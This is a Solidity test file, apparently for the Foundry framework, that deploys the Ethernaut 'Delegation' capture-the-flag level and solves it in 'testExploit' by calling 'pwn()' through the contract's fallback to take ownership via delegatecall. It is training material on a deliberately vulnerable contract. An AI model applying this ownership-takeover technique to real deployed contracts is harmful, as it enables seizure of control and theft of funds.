pragma solidity ^0.8.10;

// dependencies
import "@std/Test.sol";

// contracts
import "../src/Delegation/DelegationFactory.sol";
import "../src/Ethernaut.sol";

contract DelegationTest is Test {
    address alice = address(0x1337);

    Ethernaut ethernaut;
    Delegation ethernautDelegation;

    function setUp() public {
        vm.label(alice, "Alice");
        vm.label(address(this), "DelegationTest");
        vm.startPrank(alice);

        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        ethernautDelegation = Delegation(payable(levelAddress));

        vm.label(address(ethernautDelegation), "EthernautDelegation");
        vm.deal(alice, 5 ether);
    }

    function testExploit() public {
        address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(address(ethernautDelegation)));

        vm.stopPrank();

        assert(levelSuccessfullyPassed);
    }

}